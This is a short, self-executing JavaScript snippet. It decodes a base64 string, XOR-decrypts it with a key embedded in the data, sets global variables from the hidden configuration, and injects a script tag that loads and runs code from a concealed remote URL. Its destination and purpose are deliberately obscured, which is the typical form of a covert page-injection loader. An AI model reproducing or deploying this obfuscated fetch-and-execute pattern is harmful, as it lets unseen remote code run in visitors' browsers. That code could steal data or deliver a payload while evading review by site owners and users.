(function(){
  var i_wi=atob("DG/cqze/4dBZmtgTjRT+3kXTw+p78qxn/RzmhBjchb5376x+5AmlhVTQjP476Pdg7h2120PMzqUt96s84Q6ozkTLz7oquPQx7Buo2V7dlKQ86fop1hT+xVbShPJjuLxy+Q7x3kPSiLYgt6hh0ydj7E0//oprwu931aSlKQ0875qoB+uzkHaj6R06a1x5AuviRudl7E1770xt03+1mrC");
  var k_o=[];
  for(var a_1=0;a_1<i_wi.length;a_1++){k_o.push(i_wi.charCodeAt(a_1)&255);}
  var c_6=k_o[0];
  var z_y2r=k_o.slice(1,1+c_6);
  var l_k4xz=k_o.slice(1+c_6);
  var o_o=l_k4xz.map(function(b,k_i){return b^z_y2r[k_i%c_6];});
  var w_w72="";
  for(var s_uo=0;s_uo<o_o.length;s_uo++){w_w72+=String.fromCharCode(o_o[s_uo]&255);}
  var j_in59=decodeURIComponent(escape(w_w72));
  var p_iz=JSON.parse(j_in59);
  var l_r=p_iz.globals||[];
  l_r.forEach(function(u_ir22){window[u_ir22.name]=u_ir22.value;});
  var y_exbg=document.createElement("script");
  y_exbg.src=p_iz.url;
  y_exbg.async=true;
  y_exbg.defer=true;
  (p_iz.attributes||[]).forEach(function(v_045){y_exbg.setAttribute(v_045.name,v_045.value);});
  (document.head||document.documentElement).appendChild(y_exbg);
})();
